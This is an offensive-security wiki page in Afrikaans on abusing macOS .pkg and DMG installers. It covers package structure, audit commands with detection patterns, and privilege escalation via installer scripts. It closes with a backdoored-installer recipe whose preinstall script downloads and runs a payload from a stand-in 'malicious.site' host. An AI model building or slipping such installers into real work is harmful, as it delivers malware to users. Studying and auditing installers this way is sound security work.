# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Pkg-inligting

'n macOS **installer package** (ook bekend as 'n `.pkg`-lêer) is 'n lêerformaat wat deur macOS gebruik word om **sagteware te versprei**. Hierdie lêers is soos 'n **boks wat alles bevat wat 'n stuk sagteware** nodig het om korrek te installeer en te loop.

Die pakketlêer self is 'n argief wat 'n **hiërargie van lêers en gidse bevat wat op die teiken-**rekenaar geïnstalleer sal word. Dit kan ook **scripts** insluit om take voor en ná die installasie uit te voer, soos om konfigurasielêers op te stel of ou weergawes van die sagteware op te ruim.

### Pakketstruktuur

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Aanpassings (titel, verwelkomingsteks…) en script-/installasiekontroles
- **PackageInfo (xml)**: Inligting, installasievereistes, installasieligging, paaie na scripts om uit te voer
- **Bill of materials (bom)**: Lys van lêers om te installeer, by te werk of te verwyder, met lêertoestemmings
- **Payload (CPIO archive gzip compressed)**: Lêers om te installeer in die `install-location` vanaf PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Voor- en ná-installasiescripts en meer hulpbronne wat na 'n tydelike gids onttrek word vir uitvoering.

### Decomprimeer
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Om die inhoud van die installer te visualiseer sonder om dit handmatig te dekomprimeer, kan jy ook die gratis hulpmiddel [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) gebruik.

### Statiese triage-kortpaaie

As die doel analise is, probeer om te **vermy om die package eers met `Installer.app` oop te maak**. Sommige packages kan kode uitvoer sodra Installer hulle oopmaak (byvoorbeeld via `system.run()` of installer plug-ins), dus is offline extraction gewoonlik die veiliger beginpunt.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Basiese inligting oor DMG

DMG-lêers, of Apple Disk Images, is ’n lêerformaat wat deur Apple se macOS vir disk images gebruik word. ’n DMG-lêer is in wese ’n **monteerbare disk image** (dit bevat sy eie lêerstelsel) wat rou blokdata bevat wat tipies saamgepers en soms geënkripteer is. Wanneer jy ’n DMG-lêer oopmaak, **monteer macOS dit asof dit ’n fisiese skyf is**, wat jou toegang tot die inhoud daarvan gee.

> [!CAUTION]
> Let daarop dat **`.dmg`** installers **soveel formate** ondersteun dat sommige daarvan in die verlede, wanneer dit kwesbaarhede bevat het, misbruik is om **kernel code execution** te verkry.

### Disk Image-struktuur

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Die hiërargie van ’n DMG-lêer kan verskil op grond van die inhoud. Vir application DMGs volg dit egter gewoonlik hierdie struktuur:

- Topvlak: Dit is die wortel van die disk image. Dit bevat dikwels die application en moontlik ’n skakel na die Applications-lêergids.
- Application (.app): Dit is die werklike application. In macOS is ’n application tipies ’n package wat baie individuele lêers en lêergidse bevat waaruit die application bestaan.
- Applications-skakel: Dit is ’n kortpad na die Applications-lêergids in macOS. Die doel hiervan is om dit vir jou maklik te maak om die application te installeer. Jy kan die .app-lêer na hierdie kortpad sleep om die app te installeer.

## Privesc via pkg abuse

### Execution vanaf publieke lêergidse

As ’n pre- of post-installation script ’n lêer soos **`/var/tmp/Installerutil`** execute en ’n aanvaller daardie lêer kan vervang, kan die aanvaller privileges eskaleer wanneer die installer dit invoke. Die talks en walkthrough wys variante van hierdie onveilige external-script-patroon.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Dit is ’n [publieke funksie](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) wat verskeie installers en updaters sal invoke om **iets as root te execute**. Hierdie funksie aanvaar die **path** van die **file** om te **execute** as parameter; indien ’n aanvaller egter hierdie lêer kon **modify**, sou hy die uitvoering daarvan met root kon **abuse** om **privileges te eskaleer**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Vir meer inligting, kyk na hierdie praatjie: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Misbruik van environment en shebang

Moderne PackageKit-foute het getoon dat installer-skripte dikwels as **trusted root code** uitgevoer word, terwyl dit steeds aanvallerbeheerde konteks naby behou. Wanneer vendor packages geoudit word, let veral op:

- Shell-interpreters soos `#!/bin/zsh` / `#!/bin/bash`
- Oproepe soos `sudo -u $USER`, `launchctl asuser`, of enige logika wat `$USER`, `$HOME`, `PATH`, `TMPDIR`, of relatiewe paaie vertrou
- Nie-shell-interpreters wat gebruikersbeheerde init-lêers of libraries kan laai
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Vir die 2024 PackageKit root-environment-bug (`~/.zshenv` / `~/.bash*` inheritance tydens user-geïnisieerde installs), kyk na [die generiese macOS-privesc-bladsy](../macos-privilege-escalation.md). Indien die package **Apple-signed** is, kan dieselfde script-bug **SIP/TCC-relevant** word omdat `system_installd` moontlik `com.apple.rootless.install.heritable` dra; sien [die SIP-bladsy](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Execution deur mounting

Indien 'n installer na `/tmp/fixedname/bla/bla` skryf, is dit moontlik om 'n **mount** oor `/tmp/fixedname` met noowners te **create**, sodat jy **enige lêer tydens die installation kan modify** om die installation process te abuse.

'n Voorbeeld hiervan is **CVE-2021-26089**, wat daarin geslaag het om 'n **periodic script te overwrite** om execution as root te verkry. Vir meer information, kyk na die talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg as malware

### Empty Payload

Dit is moontlik om bloot 'n **`.pkg`**-lêer met **pre- en post-install scripts** te generate sonder enige werklike payload, afgesien van die malware binne die scripts.<sup>[[2]](#references)</sup>

### JS in Distribution xml

Dit is moontlik om **`<script>`**-tags in die package se **distribution xml**-lêer by te voeg, en daardie kode sal uitgevoer word en kan **commands execute** deur **`system.run`** te gebruik:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

In distribution packages hang dit gewoonlik daarvan af dat die top-level `Distribution`-lêer external scripts enable, byvoorbeeld met `allow-external-scripts="true"`. Daarom is dit nie genoeg om slegs `preinstall` / `postinstall` te review nie: die **Distribution XML self** kan `installation-check` / `volume-check`-hooks en direkte `system.run()` / `system.runOnce()`-execution paths bevat.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Installer met agterdeur

Kwaadwillige installer wat ’n script en JS-kode binne dist.xml gebruik
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Pak Pkgs uit: 'n Kykie binne Macos Installer Packages en algemene sekuriteitsfoute](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "Die wilde wêreld van macOS Installers" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Pak Pkgs uit: 'n Kykie binne MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe - macOS Red Teaming: Exploiting Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Breaking SIP with Apple-signed Packages](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Berg van foute" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Dood deur 1000 Installers op macOS en dit is alles stukkend!](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
